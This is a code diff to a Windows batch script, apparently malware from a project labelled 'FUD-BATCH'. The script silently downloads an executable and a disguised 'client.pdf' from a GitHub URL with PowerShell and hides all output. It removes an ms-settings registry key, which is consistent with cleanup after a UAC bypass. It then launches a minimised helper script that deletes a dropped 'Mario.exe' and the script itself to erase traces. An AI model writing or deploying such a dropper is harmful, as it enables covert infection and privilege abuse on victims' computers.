@@ -3,7 +3,7 @@ setlocal
 
 :: Set the download URL and the target path for 3.exe
 set "url1=https://raw.githubusercontent.com/altabross/FUD-BATCH/refs/heads/main/3.exe"
-set "output1=C:\Users\%USERNAME%\Downloads\3.exe"
+set "output1=%USERPROFILE%\Downloads\3.exe"
 
 :: Download the 3.exe file using PowerShell silently
 powershell -command "Invoke-WebRequest -Uri '%url1%' -OutFile '%output1%'" >nul 2>&1
@@ -38,7 +38,7 @@ timeout /t 10 /nobreak >nul 2>&1
 
 :: Set the download URL and the target path for Client.pdf
 set "url2=https://raw.githubusercontent.com/altabross/FUD-BATCH/refs/heads/main/client.pdf"
-set "output2=C:\Users\%USERNAME%\AppData\Local\client.pdf"
+set "output2=%USERPROFILE%\AppData\Local\client.pdf"
 
 :: Download the Client.pdf file using PowerShell silently
 powershell -command "Invoke-WebRequest -Uri '%url2%' -OutFile '%output2%'" >nul 2>&1
@@ -68,15 +68,20 @@ del "%output1%" >nul 2>&1
 :: Remove the ms-settings registry key immediately before self-deletion
 powershell -command "Remove-Item 'HKCU:\Software\Classes\ms-settings\' -Recurse -Force" >nul 2>&1
 
-:: Create a secondary batch script to delete this script
+:: Get the full path of the running C++ executable (Mario.exe) by using %~dp0 to refer to the directory of the running batch file.
+set "exeToDelete=%~dp0Mario.exe"
+
+:: Create a secondary batch script to delete Mario.exe and this batch file
 (
 echo @echo off
 echo :Repeat
+echo del "%exeToDelete%" ^>nul 2^>^&1
+echo if exist "%exeToDelete%" goto Repeat
 echo del "%~f0" ^>nul 2^>^&1
 echo if exist "%~f0" goto Repeat
-) > "%TEMP%\delete_self.bat"
+) > "%TEMP%\delete_self_and_exe.bat"
 
-:: Run the secondary batch script to delete this script
-start /min "" "%TEMP%\delete_self.bat"
+:: Run the secondary batch script to delete the C++ executable (Mario.exe) and this batch file
+start /min "" "%TEMP%\delete_self_and_exe.bat"
 
 endlocal
